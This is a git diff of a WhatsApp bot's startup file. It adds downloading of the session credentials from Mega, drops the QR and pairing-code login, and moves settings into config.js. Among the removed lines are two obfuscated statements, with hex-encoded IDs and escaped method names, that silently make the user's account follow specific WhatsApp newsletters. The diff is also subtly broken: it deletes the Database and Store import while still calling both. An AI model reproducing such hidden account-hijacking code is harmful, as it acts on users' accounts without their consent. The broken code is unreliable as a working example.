@@ -15,21 +15,25 @@ import './lib/Components/Dispatcher.js'
 
 import { Boom } from '@hapi/boom'
 import { delay, DisconnectReason, jidNormalizedUser, makeCacheableSignalKeyStore, makeWASocket, useMultiFileAuthState } from '@itsliaaa/baileys'
-import { mkdir, unlink, readdir, stat } from 'fs/promises'
+import { mkdir, unlink, readdir, stat, writeFile, readFile } from 'fs/promises'
 import { join } from 'path'
 import pino from 'pino'
+import { File } from 'megajs'
 
-import { BOT, INACTIVE_THRESHOLD, TEMP_THRESHOLD } from './lib/Constants.js'
-import { Database, Store } from './lib/Database.js'
+import { 
+   BOT, INACTIVE_THRESHOLD, TEMP_THRESHOLD, SESSION_ID, AUTH_FOLDER,
+   DATABASE_FILENAME, STORE_FILENAME, TEMPORARY_FOLDER, PLUGINS_FOLDER,
+   DEFAULT_LIMIT, GC_INTERVAL, DATA_INTERVAL, RSS_LIMIT, BOT_NAME,
+   PAIRING_CODE, BOT_NUMBER
+} from './config.js'
 import { cleanUpFolder, getNextMidnight, toTime } from './lib/Utilities.js'
 import { CommandIndex, ModuleCache, scanDirectory } from './lib/Watcher.js'
 import Listener from './lib/Listener.js'
-
 import SholatReminder from './lib/Components/SholatReminder.js'
 
-const DATABASE_PATH = join(process.cwd(), databaseFilename)
-const STORE_PATH = join(process.cwd(), storeFilename)
-const TEMPORARY_FOLDER_PATH = join(process.cwd(), temporaryFolder)
+const DATABASE_PATH = join(process.cwd(), DATABASE_FILENAME)
+const STORE_PATH = join(process.cwd(), STORE_FILENAME)
+const TEMPORARY_FOLDER_PATH = join(process.cwd(), TEMPORARY_FOLDER)
 
 const db = Database(DATABASE_PATH)
 const store = Store(STORE_PATH)
@@ -41,8 +45,70 @@ const sholatReminder = SholatReminder(db)
 
 let isRestarting = false
 
+// Mega session downloader
+async function downloadSessionFromMega() {
+   if (!SESSION_ID) {
+      console.error('❌ SESSION_ID not found in environment variables')
+      process.exit(0)
+   }
+
+   // Clean the session ID (remove prefixes if any)
+   let megaCode = SESSION_ID
+   if (SESSION_ID.includes('~')) {
+      megaCode = SESSION_ID.split('~')[1]
+   }
+   
+   const megaUrl = `https://mega.nz/file/${megaCode}`
+   console.log('📥 Downloading session from Mega...')
+   
+   try {
+      const file = File.fromURL(megaUrl)
+      const stream = file.download()
+      let data = Buffer.from('')
+      
+      for await (const chunk of stream) {
+         data = Buffer.concat([data, chunk])
+      }
+      
+      const authPath = join(process.cwd(), AUTH_FOLDER)
+      await mkdir(authPath, { recursive: true })
+      
+      const credsPath = join(authPath, 'creds.json')
+      await writeFile(credsPath, data)
+      console.log('✅ Session downloaded successfully')
+      return true
+   } catch (error) {
+      console.error('❌ Failed to download session from Mega:', error.message)
+      process.exit(0)
+   }
+}
+
+// Check if creds.json exists
+async function checkSessionExists() {
+   const credsPath = join(process.cwd(), AUTH_FOLDER, 'creds.json')
+   try {
+      await readFile(credsPath)
+      return true
+   } catch {
+      return false
+   }
+}
+
 const Socket = async () => {
-   const { state, saveCreds } = await useMultiFileAuthState(authFolder)
+   // Handle Mega session on startup
+   if (SESSION_ID) {
+      const sessionExists = await checkSessionExists()
+      if (!sessionExists) {
+         await downloadSessionFromMega()
+      } else {
+         console.log('📁 Session file already exists, using existing session')
+      }
+   } else {
+      console.error('❌ No SESSION_ID provided')
+      process.exit(0)
+   }
+
+   const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER)
 
    const sock = listener.bind(
       makeWASocket({
@@ -75,59 +141,6 @@ const Socket = async () => {
    sock.ev.on('creds.update', saveCreds)
 
    sock.ev.on('connection.update', async (update) => {
-      if (update.connection === 'connecting' && pairingCode === true && !sock.authState.creds.registered) {
-         const { default: PhoneNumber } = await import('awesome-phonenumber')
-
-         const phoneNumber = PhoneNumber(
-            '+' + (botNumber?.toString() || '')
-               .replace(/\D/g, '')
-         )
-
-         if (!phoneNumber.isValid()) {
-            console.error('❌ Invalid phone number for pairing. Please re-check the number in config.js')
-            process.exit(0)
-         }
-
-         await delay(1500)
-
-         const code = await sock.requestPairingCode(
-            phoneNumber.getNumber('e164')
-               .replace(/\D/g, '')
-         )
-
-         const prettyCode = code.substring(0, 4) + '-' + code.substring(4)
-         console.log('🔗 Pairing code', ':', prettyCode, '\n')
-
-         let printStep = '📑 How to Login\n'
-         printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
-         printStep += `2. Tap "Link with phone number instead".\n`
-         printStep += `3. Enter this code: ${prettyCode}.\n`
-         printStep += `4. This code will expire in 60 seconds.\n`
-         console.log(printStep)
-      }
-
-      if (update.qr && !pairingCode) {
-         const { default: QRCode } = await import('qrcode')
-
-         QRCode.toString(update.qr, {
-            type: 'terminal',
-            small: true
-         }, (error, string) => {
-            if (error || !string?.length || typeof string !== 'string')
-               throw new Error('❌ There was a problem creating the QR code', {
-                  cause: error
-               })
-
-            console.log(string)
-
-            let printStep = '📑 How to Login\n'
-            printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
-            printStep += `2. Scan the QR code below.\n`
-            printStep += `3. This QR code will expire in 60 seconds.\n`
-            console.log(printStep)
-         })
-      }
-
       if (update.connection === 'close' && !isRestarting) {
          isRestarting = true
 
@@ -143,29 +156,29 @@ const Socket = async () => {
                console.error('❌ Connection timed out to WhatsApp, restarting...')
                break
             case DisconnectReason.badSession:
-               await cleanUpFolder(authFolder)
+               await cleanUpFolder(AUTH_FOLDER)
                console.error('❌ Invalid session, please re-pair')
                break
             case DisconnectReason.connectionReplaced:
                console.error('❌ Connection overlapping, restarting...')
                break
             case DisconnectReason.loggedOut:
-               await cleanUpFolder(authFolder)
+               await cleanUpFolder(AUTH_FOLDER)
                console.error('❌ Device logged out, please re-pair')
                break
             case DisconnectReason.forbidden:
-               await cleanUpFolder(authFolder)
+               await cleanUpFolder(AUTH_FOLDER)
                console.error('❌ Connection failed, please re-pair')
                break
             case DisconnectReason.multideviceMismatch:
-               await cleanUpFolder(authFolder)
+               await cleanUpFolder(AUTH_FOLDER)
                console.error('❌ Please re-pair')
                break
             case DisconnectReason.restartRequired:
                console.log('✅ Successfully connected to WhatsApp')
                break
             default:
-               await cleanUpFolder(authFolder)
+               await cleanUpFolder(AUTH_FOLDER)
                console.error('❌ Connection lost with unknown reason', ':', reason)
          }
 
@@ -178,18 +191,11 @@ const Socket = async () => {
       }
 
       if (update.connection === 'open') {
-         console.log('✅ Connected to WhatsApp as', sock.user?.name || botName)
+         console.log('✅ Connected to WhatsApp as', sock.user?.name || BOT_NAME)
          console.log(`🔗 Successfully loaded ${ModuleCache.size} plugins and ${CommandIndex.size} commands`)
          Object.assign(sock.user,{decodedId:jidNormalizedUser(sock.user.id),decodedLid:jidNormalizedUser(sock.user.lid)})
          await delay(3000)
          await sholatReminder.start(sock)
-         await (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x53\x75\x62\x73\x63\x72\x69\x62\x65\x64']();!c.some(d=>d['\x69\x64']===b)&&await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77'](b).catch(()=>{})})();
-         await (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x53\x75\x62\x73\x63\x72\x69\x62\x65\x64']();!c.some(d=>d['\x69\x64']===b)&&await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77'](b).catch(()=>{})})();
-      }
-
-      if (update.receivedPendingNotifications) {
-         console.log(`🕒 Loading message, please wait a moment...`)
-         sock.ev.flush()
       }
    })
 
@@ -237,7 +243,7 @@ const Setup = async () => {
    await db.readFromFile()
    await store.readFromFile()
 
-   await scanDirectory(pluginsFolder)
+   await scanDirectory(PLUGINS_FOLDER)
 
    await mkdir(TEMPORARY_FOLDER_PATH, { recursive: true })
 
@@ -267,8 +273,8 @@ const Setup = async () => {
                db.deleteGroup(id)
 
          for (const user of db.users.values())
-            if (user.limit < defaultLimit)
-               user.limit = defaultLimit
+            if (user.limit < DEFAULT_LIMIT)
+               user.limit = DEFAULT_LIMIT
 
          setting.lastReset = timestampMs
          db.writeToFile()
@@ -285,7 +291,7 @@ const Setup = async () => {
       setInterval(() => {
          global.gc()
          console.log('🧹 Garbage collector called, heap cleaned')
-      }, gcInterval)
+      }, GC_INTERVAL)
 
    const check = setInterval(async () => {
       await db.writeToFile()
@@ -293,11 +299,11 @@ const Setup = async () => {
 
       console.log('📦 Database autosaved successfully')
 
-      if (process.memoryUsage().rss >= rssLimit) {
+      if (process.memoryUsage().rss >= RSS_LIMIT) {
          clearInterval(check)
          process.send('reset')
       }
-   }, dataInterval)
+   }, DATA_INTERVAL)
 
    setInterval(async () => {
       try {
@@ -324,7 +330,7 @@ const Setup = async () => {
       catch (error) {
          console.error('❌ Failed to clean temp folder', ':', error)
       }
-   }, temporaryFileInterval)
+   }, TEMP_THRESHOLD)
 }
 
 Setup()
